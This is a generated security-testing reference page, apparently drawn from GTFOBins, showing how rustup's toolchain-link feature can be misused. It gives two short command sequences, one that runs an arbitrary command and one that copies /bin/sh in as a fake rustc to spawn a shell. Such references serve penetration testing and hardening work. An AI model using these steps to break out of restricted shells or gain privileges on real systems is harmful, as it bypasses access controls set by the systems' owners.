---
parsed_by: focuslocust
source: commands
type: generated
---
# rustup Commands

[Home](../../../README.md)

> This page contains security testing commands. Use only in authorised environments.

## rustup

Tool page: [rustup](../../tools/linux/rustup.md)

### command

```text
mkdir /path/to/temp-dir/bin/
mkdir /path/to/temp-dir/lib/
echo '/path/to/command' >/path/to/temp-dir/bin/rustc
chmod +x /path/to/temp-dir/bin/rustc
rustup toolchain link x /path/to/temp-dir/
rustup run x rustc
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/rustup` |
| Evidence | Function example preserved from source parser. |

### shell

```text
mkdir /path/to/temp-dir/bin/
mkdir /path/to/temp-dir/lib/
cp /bin/sh /path/to/temp-dir/bin/rustc
rustup toolchain link x /path/to/temp-dir/
rustup run x rustc
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/rustup` |
| Evidence | Function example preserved from source parser. |
